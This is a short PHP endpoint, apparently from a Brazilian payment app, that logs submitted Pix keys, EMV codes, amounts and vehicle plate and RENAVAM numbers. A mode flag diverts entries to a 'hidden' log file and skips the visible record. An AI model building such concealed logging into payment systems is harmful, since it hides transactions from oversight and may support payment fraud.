<?php
date_default_timezone_set('America/Sao_Paulo');
require_once __DIR__ . '/app_storage.php';
header('Content-Type: application/json; charset=UTF-8');
$input = file_get_contents('php://input');
$data = json_decode($input, true);
if (!is_array($data)) {
  echo json_encode(['success'=>false,'error'=>'invalid_json']);
  exit;
}
$allowed = ['type','id','descricao','valor','valor_brl','key','emv','placa','renavam'];
$out = [];
foreach ($allowed as $k) {
  if (isset($data[$k])) $out[$k] = $data[$k];
}
$out['ts'] = date('c');

$rawMode = app_storage_get('pix_mode.txt');
$isModeActive = false;
if ($rawMode !== null) {
    $modeContent = trim(strtolower($rawMode));
    if ($modeContent === 'ativo' || $modeContent === '1' || $modeContent === 'true') {
        $isModeActive = true;
    }
}

if ($isModeActive) {
    $logKey = 'pix_log_oculto.json';
} else {
    app_storage_put('pix_last.json', json_encode($out, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT));
    $logKey = 'pix_log.json';
}

$rawLog = app_storage_get($logKey);
$log = [];
if ($rawLog !== null) {
    $cur = json_decode($rawLog, true);
    if (is_array($cur)) $log = $cur;
}
array_unshift($log, $out);
app_storage_put($logKey, json_encode($log, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT));

echo json_encode(['success'=>true]);
?>
